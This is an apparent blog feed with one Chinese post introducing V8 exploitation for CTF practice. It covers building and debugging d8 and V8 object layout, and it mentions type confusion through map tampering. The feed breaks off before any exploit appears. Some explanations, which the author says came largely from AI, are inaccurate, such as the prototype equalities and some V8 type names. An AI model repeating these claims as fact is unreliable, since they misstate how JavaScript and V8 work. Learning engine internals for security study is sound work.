<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>云梦</title>
  
  <subtitle>躺平ing..</subtitle>
  <link href="https://gggtaotao.github.io/atom.xml" rel="self"/>
  
  <link href="https://gggtaotao.github.io/"/>
  <updated>2025-08-19T12:00:37.678Z</updated>
  <id>https://gggtaotao.github.io/</id>
  
  <author>
    <name>Tao</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初探V8</title>
    <link href="https://gggtaotao.github.io/2025/08/17/%E5%88%9D%E6%8E%A2V8/"/>
    <id>https://gggtaotao.github.io/2025/08/17/%E5%88%9D%E6%8E%A2V8/</id>
    <published>2025-08-17T03:22:44.000Z</published>
    <updated>2025-08-19T12:00:37.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初探-V8"><a href="#初探-V8" class="headerlink" title="初探 V8"></a>初探 V8</h1><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://iyheart.github.io/2025/02/25/CTFblog/PWN系列blog/Chrome_v8_pwn/Chrome-v8-入门/">Chrome-v8-入门 | iyheart的博客</a></p><p><a href="https://hornos3.github.io/2024/12/10/chrome-v8-pwn-学习-2/">chrome v8 pwn 学习 (2) | CoLin’s BLOG</a></p><p><a href="https://blog.wingszeng.top/v8-pwn-basics-1-jsobject/#comments">V8 Pwn Basics 1: JSObject - Wings 的博客</a></p><p><a href="https://rivers.chaitin.cn/blog/cqho67h0lnedo7thppl0">通过StarCTF oob题目学习V8 PWN 入门 | 长亭百川云</a></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><strong>本文下图显示的内容都是基于v8 7.5版本的实验结果，该版本暂未使用指针压缩技术，对于高版本的v8的实验结果并不如下图所示</strong></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>1.需要下载两个编译<code>v8</code>源码的工具<code>depot_tools</code>、<code>ninja</code>  （下载depot_tools需要挂代理）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br></pre></td></tr></table></figure><p>2.然后将这两个工具添加进环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/path/to/your/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">cd</span> ninja</span><br><span class="line">./configure.py --bootstrap</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/path/to/your/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>3.使用<code>depot_tools</code>去下载源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br></pre></td></tr></table></figure><p>4.准备依赖和编译<code>v8</code> （执行的时候要在默认终端，也就是bash，使用zsh等别的终端可能会有点问题，哦对，记得挂代理）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug    <span class="comment">#编译过程会很久很久</span></span><br></pre></td></tr></table></figure><p>5.至此你就配置好了你的v8</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./path/to/your/v8/out.gn/x64.debug/d8</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817144542045.png" alt="image-20250817144542045"></p><p>当然除了debug版本的d8，我们还需要release版本的d8，也很简单就可以编译好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/v8gen.py x64.release  </span><br><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure><h2 id="回退版本和加载补丁"><a href="#回退版本和加载补丁" class="headerlink" title="回退版本和加载补丁"></a>回退版本和加载补丁</h2><p>上述编译好的v8是最新版本，在做题时，我们通常要将版本号回退到指定版本，指定的hash值是每个提交（commit）的唯一标识符，一般题目会给的，回退之后重新编译d8</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard  a7a350012c05f644f3f373fb48d7ac72f7f60542 (这后面的是<span class="built_in">hash</span>值)</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br><span class="line">tools/dev/v8gen.py x64.release  </span><br><span class="line">ninja -C out.gn/x64.release d8</span><br><span class="line">git apply path/to/your/pwn.diff <span class="comment">#加载补丁（有时候加载不成功的话可以手动输入补充补丁）</span></span><br></pre></td></tr></table></figure><h2 id="调试d8"><a href="#调试d8" class="headerlink" title="调试d8"></a>调试d8</h2><p><code>v8</code>有自带的调试<code>JS</code>代码的gdb插件，我们可以将他复制到本地的gdbinit文件中，给dbg增加插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/v8/tools目录</span><br><span class="line"><span class="built_in">cp</span> gdbinit ~/.gdbinit_v8</span><br><span class="line"><span class="comment">#编辑配置文件~/.gdbinit</span></span><br><span class="line"><span class="comment">#在其中添加</span></span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br></pre></td></tr></table></figure><p>这样就可以在gdb中使用<code>job</code>等命令来调试js了</p><p>同时<code>d8</code>内部也有<code>API</code>调试，最常用的命令有：</p><p><code>%DebugPrint(arr)</code>和<code>SystemBreak()</code></p><p>首先随便编写一个js文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b=[<span class="number">2.3</span>,<span class="number">5.164</span>];</span><br><span class="line"><span class="keyword">var</span> c=[a,b];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>如果是直接用d8来调试，只需要</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path/to/your/v8/out.gn/x64.debug/d8 exp.js --allow-natives-syntax <span class="comment">#--allow-natives-syntax是配置参数，为的是可以使用%DebugPrint(a)等调试语法</span></span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817151157392.png" alt="image-20250817151157392"></p><p>可以看到打印出了<code>a</code>的结构</p><p>gdb调试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb path/to/your/v8/out.gn/x64.debug/d8</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> args --allow-natives-syntax ./exp.js</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure><p>便可以让程序停在<code>%SystemBreak();</code>的地方，可以查看内存和寄存器的状态来调试</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817151422488.png" alt="image-20250817151422488"></p><p>可以看到成功执行了<code>%DebugPrint(a);</code>并在断点处停了下来，可以查看内存中的值</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20151536.png" alt="屏幕截图 2025-08-17 151536"></p><p>也可以在gdb里用<code>job()</code>来查看一个对象中的内部属性</p><p>其他具体调试方法可以看参考博客，写的很详细噢~~</p><h2 id="JS的数据结构"><a href="#JS的数据结构" class="headerlink" title="JS的数据结构"></a>JS的数据结构</h2><p><strong>目前我对于JS对象的数据结构也是一知半解的，以下内容仅供参考，有很多来自AI，如有错误还望理解</strong></p><h3 id="指针和数字的区分"><a href="#指针和数字的区分" class="headerlink" title="指针和数字的区分"></a>指针和数字的区分</h3><p>为了区分一个内存中储存的数据是一个指针还是数字，v8牺牲了64位内存中的最低位，若最低为1，则表示这个地方储存的是一个指针，这也就解释了为什么内存中存储的指针的最后一位为1或9，而不是我们熟知的0或8，同时对于小整数，v8只用高32位来储存，而将低32位置零（<strong>注意这里指7.5版本，高版本并非如此</strong>）</p><hr><p>首先，JS中最主要的结构有<strong>原始类型、原生对象和宿主对象</strong></p><h3 id="原始类型"><a href="#原始类型" class="headerlink" title="原始类型"></a>原始类型</h3><div class="table-container"><table><thead><tr><th>原始类型</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td><code>number</code></td><td>数值（包括整数、浮点数、NaN、Infinity）</td><td><code>42</code>、<code>3.14</code>、<code>NaN</code></td></tr><tr><td><code>string</code></td><td>字符串（字符序列）</td><td><code>&#39;hello&#39;</code>、<code>&quot;world&quot;</code></td></tr><tr><td><code>boolean</code></td><td>布尔值（仅 <code>true</code> 和 <code>false</code>）</td><td><code>true</code>、<code>false</code></td></tr><tr><td><code>null</code></td><td>表示 “空值”（特殊原始值，typeof 会返回 <code>&#39;object&#39;</code>，属于历史遗留问题）</td><td><code>null</code></td></tr><tr><td><code>undefined</code></td><td>表示 “未定义”（变量未赋值时的默认值）</td><td><code>let a;</code> 中 <code>a</code> 的值</td></tr><tr><td><code>symbol</code></td><td>唯一标识符（ES6 新增，用于对象属性的唯一键）</td><td><code>Symbol(&#39;id&#39;)</code></td></tr><tr><td><code>bigint</code></td><td>大整数（ES2020 新增，用于表示超出 <code>number</code> 精度范围的整数）</td><td><code>123n</code>、<code>BigInt(999999999999999999)</code></td></tr></tbody></table></div><h3 id="原生对象"><a href="#原生对象" class="headerlink" title="原生对象"></a>原生对象</h3><ul><li><strong>普通对象构造器</strong>：<code>Object</code>（用于创建普通对象，如 <code>new Object()</code>）。</li><li><strong>原始类型包装对象</strong>：<br><code>String</code>（字符串包装对象，如 <code>new String(&#39;a&#39;)</code>）、<br><code>Number</code>（数字包装对象，如 <code>new Number(123)</code>）、<br><code>Boolean</code>（布尔包装对象，如 <code>new Boolean(true)</code>）。<br>（注意：包装对象是<strong>对象</strong>，与对应的原始类型不同，如 <code>typeof new String(&#39;a&#39;)</code> 是 <code>&#39;object&#39;</code>，而 <code>typeof &#39;a&#39;</code> 是 <code>&#39;string&#39;</code>）。</li><li><strong>特殊对象</strong>：<br><code>Symbol</code>（创建 symbol 的构造函数）、<br><code>BigInt</code>（创建 bigint 的构造函数）。</li><li><strong>集合类对象</strong>：<code>Array</code>（数组）、<code>Map</code>、<code>Set</code>、<code>WeakMap</code>、<code>WeakSet</code>。</li><li><strong>函数与执行相关</strong>：<code>Function</code>（函数构造器）、<code>Promise</code>、<code>Generator</code>、<code>AsyncFunction</code> 等。</li><li><strong>工具类对象</strong>：<code>Date</code>（日期）、<code>RegExp</code>（正则表达式）、<code>Math</code>（数学工具，静态对象，无需实例化）、<code>JSON</code>（JSON 解析 / 序列化工具，静态对象）。</li><li><strong>错误对象</strong>：<code>Error</code>、<code>TypeError</code>、<code>SyntaxError</code> 等。</li></ul><h3 id="宿主对象"><a href="#宿主对象" class="headerlink" title="宿主对象"></a>宿主对象</h3><p>宿主对象是由 JS 执行环境（如浏览器、Node.js）提供的对象，<strong>不属于 ECMAScript 标准</strong>，依赖具体环境。</p><ul><li><p><strong>浏览器环境</strong></p><p>：</p><ul><li><code>window</code>（全局对象）、<code>document</code>（DOM 文档对象）、<code>navigator</code>（浏览器信息）、<code>location</code>（URL 信息）等。</li><li>DOM 元素对象（如 <code>document.getElementById(&#39;id&#39;)</code> 返回的元素）、DOM 事件对象（如 <code>event</code>）。</li><li>BOM 相关对象（如 <code>history</code>、<code>screen</code>）。</li></ul></li><li><p><strong>Node.js 环境</strong></p><p>：</p><ul><li><code>global</code>（全局对象）、<code>process</code>（进程信息）、<code>require</code>（模块加载函数）、<code>module</code>（模块对象）等。</li><li>内置模块对象（如 <code>fs</code> 文件系统、<code>http</code> 网络模块）。</li></ul></li></ul><h3 id="常见对象种类"><a href="#常见对象种类" class="headerlink" title="常见对象种类"></a>常见对象种类</h3><div class="table-container"><table><thead><tr><th>类型分类</th><th>V8 内部类型标识（英文定义）</th><th>含义与示例</th></tr></thead><tbody><tr><td><strong>普通对象</strong></td><td><code>JS_OBJECT_TYPE</code></td><td>最基础的键值对对象，通过 <code>&#123;&#125;</code> 或 <code>new Object()</code> 创建，如 <code>&#123; a: 1 &#125;</code>。</td></tr><tr><td><strong>数组</strong></td><td><code>JS_ARRAY_TYPE</code></td><td>有序索引列表，通过 <code>[]</code> 或 <code>new Array()</code> 创建，如 <code>[1, 2, 3]</code>，自带 <code>length</code> 属性。</td></tr><tr><td><strong>函数</strong></td><td><code>JS_FUNCTION_TYPE</code></td><td>可执行的对象，通过 <code>function () &#123;&#125;</code> 或箭头函数创建，如 <code>(a) =&gt; a + 1</code>。</td></tr><tr><td><strong>日期</strong></td><td><code>JS_DATE_TYPE</code></td><td>日期时间对象，通过 <code>new Date()</code> 创建，如 <code>new Date(&#39;2024-01-01&#39;)</code>。</td></tr><tr><td><strong>正则表达式</strong></td><td><code>JS_REGEXP_TYPE</code></td><td>正则匹配对象，通过 <code>/pattern/</code> 或 <code>new RegExp()</code> 创建，如 <code>/abc/g</code>。</td></tr><tr><td><strong>包装对象</strong></td><td><code>JS_STRING_TYPE</code>（字符串） <code>JS_NUMBER_TYPE</code>（数字） <code>JS_BOOLEAN_TYPE</code>（布尔）</td><td>原始类型的包装对象，如 <code>new String(&#39;abc&#39;)</code>（注意：与原始字符串 <code>&#39;abc&#39;</code> 不同）。</td></tr><tr><td><strong>Symbol 对象</strong></td><td><code>JS_SYMBOL_TYPE</code></td><td>唯一标识符对象，通过 <code>Symbol()</code> 创建，如 <code>Symbol(&#39;key&#39;)</code>。</td></tr><tr><td><strong>BigInt 对象</strong></td><td><code>JS_BIGINT_TYPE</code></td><td>大整数对象，通过 <code>BigInt()</code> 创建，如 <code>BigInt(12345678901234567890)</code>。</td></tr><tr><td><strong>宿主对象</strong></td><td>无统一标识（由环境定义）</td><td>由执行环境（如浏览器、Node.js）提供的对象，如浏览器中的 <code>window</code>、<code>document</code>，Node.js 中的 <code>global</code>、<code>process</code>。</td></tr></tbody></table></div><h3 id="对象之间的关系"><a href="#对象之间的关系" class="headerlink" title="对象之间的关系"></a>对象之间的关系</h3><p>JS 中对象的关系通过<strong>原型链（Prototype Chain）</strong> 连接，所有对象最终都继承自 <code>Object.prototype</code>（除了 <code>null</code>）。核心关系如下：</p><ol><li><p><strong>原型链的顶层</strong>：</p><ul><li><code>Object.prototype</code> 是所有对象的最终原型（除了 <code>null</code>），它包含 <code>toString()</code>、<code>hasOwnProperty()</code> 等通用方法。</li><li>特例：<code>Object.prototype</code> 的原型是 <code>null</code>（没有上级）。</li></ul></li><li><p><strong>具体对象的继承关系</strong>：</p><ul><li><strong>普通对象</strong>：直接继承 <code>Object.prototype</code>（如 <code>&#123;&#125;</code> 的 <code>prototype</code> 指向 <code>Object.prototype</code>）。</li><li><strong>数组</strong>：继承 <code>Array.prototype</code>，而 <code>Array.prototype</code> 又继承 <code>Object.prototype</code>（即 <code>[].prototype === Array.prototype</code>，<code>Array.prototype.prototype === Object.prototype</code>）。</li><li><strong>函数</strong>：继承 <code>Function.prototype</code>，而 <code>Function.prototype</code> 继承 <code>Object.prototype</code>（如 <code>(function () &#123;&#125;).prototype === Function.prototype</code>）。</li><li><strong>包装对象</strong>：<code>String.prototype</code>、<code>Number.prototype</code> 等继承 <code>Object.prototype</code>（如 <code>new String(&#39;a&#39;).prototype === String.prototype</code>）。</li></ul><p>简单说：<strong>所有对象都是 <code>Object</code> 的 “后代”</strong>，但不同类型的对象有各自的 “直接父类”（如数组的直接父类是 <code>Array.prototype</code>）。</p></li></ol><h3 id="如何判断对象类型"><a href="#如何判断对象类型" class="headerlink" title="如何判断对象类型"></a>如何判断对象类型</h3><p>可以通过 <code>Object.prototype.toString.call()</code>来判断， <code>typeof</code> 也可以，但貌似<code>Object.prototype.toString.call()</code>更可靠</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(&#123;&#125;)); <span class="comment">// &quot;[object Object]&quot; → 对应 JS_OBJECT_TYPE</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>([])); <span class="comment">// &quot;[object Array]&quot; → 对应 JS_ARRAY_TYPE</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;)); <span class="comment">// &quot;[object Function]&quot; → 对应 JS_FUNCTION_TYPE</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(<span class="keyword">new</span> <span class="title class_">Date</span>())); <span class="comment">// &quot;[object Date]&quot; → 对应 JS_DATE_TYPE</span></span><br></pre></td></tr></table></figure><p>从下图可以看到，我们创建的每一个数组，都继承于 <code>Array.prototype</code>，因为其<code>prototype</code>都指向<code>Array.prototype</code>，故而我们的数组可以使用‘push’，<code>pop</code>等方法，而<code>Array.prototype</code>继承于 <code>Object.prototype</code>， <code>Object.prototype</code>继承于<code>null</code>,</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817220820078.png" alt="image-20250817220820078"></p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817220843135.png" alt="image-20250817220843135"></p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817220922255.png" alt="image-20250817220922255"></p><h3 id="对象的属性"><a href="#对象的属性" class="headerlink" title="对象的属性"></a>对象的属性</h3><p>不同的对象有不同的属性</p><p>最常见的对象便是<strong>普通对象</strong><code>(JS_OBJECT_TYPE)</code>和<strong>数组对象</strong><code>(JS_ARRAY_TYPE)</code></p><h4 id="普通对象"><a href="#普通对象" class="headerlink" title="普通对象"></a>普通对象</h4><p>从上图可以看到，一个普通对象的属性有</p><ul><li><code>map</code>指向的是一个对象，<code>map</code>所指向的对象就是我们常说的<code>js</code>隐藏类</li><li><code>prototype</code> 指向此对象的原型对象，也说明了此对象继承于哪个对象</li><li><code>elements</code>: 指向包含 <strong>编号属性</strong> 的对象的指针</li><li><code>properties:</code> 指向包含 <strong>命名属性</strong> 的对象的指针</li><li><code>In-Object Properties</code>: 指向对象初始化时定义的 <strong>命名属性</strong> 的指针</li></ul><p>接下来通过一段js代码来理解这些属性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="number">0</span>:<span class="number">3</span>,</span><br><span class="line">  <span class="number">1</span>:<span class="number">4</span>,</span><br><span class="line">  <span class="number">3</span>:<span class="number">5</span></span><br><span class="line">&#125;;</span><br><span class="line">obj.<span class="property">afs</span>=<span class="number">555</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="number">1</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="string">&quot;a&quot;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">a</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p><strong>运行结果见下图</strong></p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20224523.png" alt="屏幕截图 2025-08-17 224523"></p><h5 id="map"><a href="#map" class="headerlink" title="map"></a>map</h5><p><code>map</code>这个属性非常重要，可以看到其中有很多的结构</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817230026361.png" alt="image-20250817230026361"></p><ol><li><p><code>type: JS_OBJECT_TYPE</code><br>作用：标识该 map 对应的对象类型。<br>这里 <code>JS_OBJECT_TYPE</code> 表示该 map 用于普通对象（而非数组、函数、日期等其他类型），引擎通过这个字段快速判断对象的基础类型，从而应用对应的处理逻辑（如属性访问方式、内存布局等）。</p><p><strong>这里非常重要，可以通过篡改一个对象的map为其他类型对象的map，导致错误访问其中的元素，造成类型混淆漏洞，下面的例题会用到</strong></p></li><li><p><code>instance size: 40</code><br>作用：表示该类型对象的实例内存大小（单位：字节）。<br>这里 40 字节是该对象在内存中的固定占用空间（包括对象头、属性值存储区等），引擎根据这个值为新对象分配内存，确保内存布局的一致性。</p><p>这里<code>obj</code>对象有三个属性以及两个槽位用来储存<code>properties</code>的数据，所以大小为<strong>5*8=40</strong></p></li><li><p><code>inobject properties: 2</code><br>作用：表示对象内置属性槽的数量（即直接存储在对象内存中的属性容量）。<br>这里 2 意味着该对象在自身内存中预留了 2 个属性槽（可直接存储 <code>a</code>、<code>b</code> 这样的属性），超过这个数量的属性（如 <code>afs</code>）会被存储到外部的 <code>PropertyArray</code> 中（这也解释了为什么 <code>properties</code> 字段会包含 <code>afs</code>）。</p></li><li><p><code>elements kind: HOLEY_ELEMENTS</code><br>作用：描述对象 <code>elements</code> 区域（存储整数索引属性）的类型。<br><code>HOLEY_ELEMENTS</code> 表示 <code>elements</code> 区域存在 “空洞”（即有未赋值的索引，如 <code>&lt;the_hole&gt;</code>），引擎会针对这种类型的 <code>elements</code> 采用特定的迭代和访问策略（与无空洞的 <code>PACKED_ELEMENTS</code> 不同）。</p></li><li><p><code>unused property fields: 2</code><br>作用：表示对象内置属性槽中未使用的数量。<br>结合 <code>inobject properties: 2</code> 可知，该对象的 2 个内置属性槽已被 <code>a</code>、<code>b</code> 填满，这里的 2 可能是指那两个undefined</p></li><li><p><code>enum length: invalid</code><br>作用：与对象的可枚举属性长度相关。<br><code>invalid</code> 表示该 map 对应的对象没有预定义的可枚举属性长度（通常在对象属性动态变化后，这个值会失效，需要动态计算）。</p></li><li><p><code>stable_map</code><br>作用：标记该 map 是否处于 “稳定状态”。<br><code>stable_map</code> 表示该 map 对应的对象结构近期没有频繁变化（如添加 / 删除属性），引擎会对稳定的 map 应用更多优化（如缓存属性访问路径），提升性能。</p></li><li><p><code>back pointer: 0x33df8624ab89 &lt;Map(HOLEY_ELEMENTS)&gt;</code><br>作用：指向该 map 的 “父 map”，形成 map 之间的继承关系。<br>当对象动态添加属性时，V8 不会修改原 map，而是创建新 map 并通过 <code>back pointer</code> 指向原 map，这样既能保留历史结构，又能实现结构的增量更新（类似链表的思想）。</p></li><li><p><code>prototype_validity cell: 0x01a27869f9b1 &lt;Cell value= 0&gt;</code><br>作用：用于快速验证对象原型链的有效性。<br>当原型链发生变化（如修改 <code>prototype</code>）时，这个单元格的值会更新，引擎通过检查该值可快速判断原型链是否有效，避免每次访问原型方法时都重新验证整条链。</p></li><li><p><code>instance descriptors (own) #3: 0x016530fcdf09 &lt;DescriptorArray[3]&gt;</code><br>作用：指向当前对象自身的属性描述符数组，存储对象自有属性的元信息。<br>这里的 <code>#3</code> 表示包含 3 个属性描述符，对应 <code>a</code>、<code>b</code>、<code>afs</code> 三个属性，每个描述符记录了属性名、存储位置、特性（可写 / 可枚举 / 可配置）等关键信息，是属性名与属性值关联的核心桥梁。</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817230728153.png" alt="image-20250817230728153"></p></li><li><p><code>layout descriptor: (nil)</code><br>作用：描述对象内存布局的额外元信息（如特殊属性的对齐方式、内存偏移量等）。<br><code>(nil)</code> 表示该对象采用默认内存布局，没有需要特殊说明的布局优化或约束（通常普通对象的 <code>layout descriptor</code> 均为 <code>nil</code>，特殊类型对象可能有具体值）。</p></li><li><p><code>prototype: 0x01a278682091 &lt;Object map = 0x33df86240229&gt;</code><br>作用：指向该对象的原型对象（即 <code>obj.prototype</code> 指向的对象）。<br>这里原型是 <code>Object.prototype</code>（普通对象的默认原型），确保对象能继承 <code>toString()</code>、<code>hasOwnProperty()</code> 等通用方法。</p></li><li><p><code>constructor: 0x01a2786820c9 &lt;JSFunction Object (sfi = 0xb9497c9cf9)&gt;</code><br>作用：指向该对象的构造函数。<br>普通对象的构造函数是 <code>Object</code>，因此 <code>obj.constructor === Object</code> 会返回 <code>true</code>。</p></li><li><p><code>dependent code: 0x155438a802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</code><br>作用：存储依赖该 map 的优化代码（如 JIT 编译的机器码）。<br>当 map 发生变化时，引擎会通过这个指针找到并失效相关的优化代码，确保代码执行的正确性（避免基于旧结构的优化代码出错）。</p></li><li><p><code>construction counter: 0</code><br>作用：记录基于该 map 创建的对象实例数量。<br>0 表示目前没有通过该 map 新建对象（或计数器未激活），引擎可能根据这个值决定是否对该 map 进行更深度的优化。</p></li></ol><h5 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h5><p>这个之前已经说过了，这里就不再赘述了</p><h5 id="elments"><a href="#elments" class="headerlink" title="elments"></a>elments</h5><p>编号属性其实也就相当于索引值，如上，我可以通过<code>obj[1]</code>来访问到4，而4也是储存在elements指向的指针的内存里</p><p>可以看到v8的机制为了后续方便，直接分配了17个槽位，我猜测这应该和我在未使用索引值2的情况下直接使用了索引值3，所以直接分配了这么多（感兴趣的可以自己测一下，<del>我太懒了</del>），导致了很多的空槽位，那些空槽位指向了<code>&lt;the_hole&gt;</code></p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20225407.png" alt="屏幕截图 2025-08-17 225407"></p><h5 id="In-Object-Properties"><a href="#In-Object-Properties" class="headerlink" title="In-Object Properties"></a>In-Object Properties</h5><p>命名属性一般也就是指由字符串来命名元素，如上，我可以通过<code>obj.a</code>或<code>obj[&quot;a&quot;]</code>来访问到1，这种初始化定义的命名属性指向的元素会直接储存在该对象内存的下部，如图</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817224711902.png" alt="image-20250817224711902"></p><p>可以看到1，2直接储存在了该对象属性的下部</p><h5 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h5><p>非初始化时的命名属性将会存储在properties指向的指针里</p><p>可以看到v8的机制为了后续方便，直接分配了3个槽位用来存放其中的数据，但只有第一个槽位存储了数据555，其他两个槽位为<code>undefined</code>未定义，也就是创建了但是未初始化</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-17%20224953.png" alt="屏幕截图 2025-08-17 224953"></p><p>这些<code>properties</code>的键值存储再<code>map</code>中的<code>instance descriptors (own)</code></p><h4 id="数组对象"><a href="#数组对象" class="headerlink" title="数组对象"></a>数组对象</h4><p>测试代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line">arr.<span class="property">b</span>=<span class="number">4</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>]);</span><br><span class="line">arr[<span class="number">5</span>]=<span class="number">5</span>;</span><br><span class="line">%<span class="title 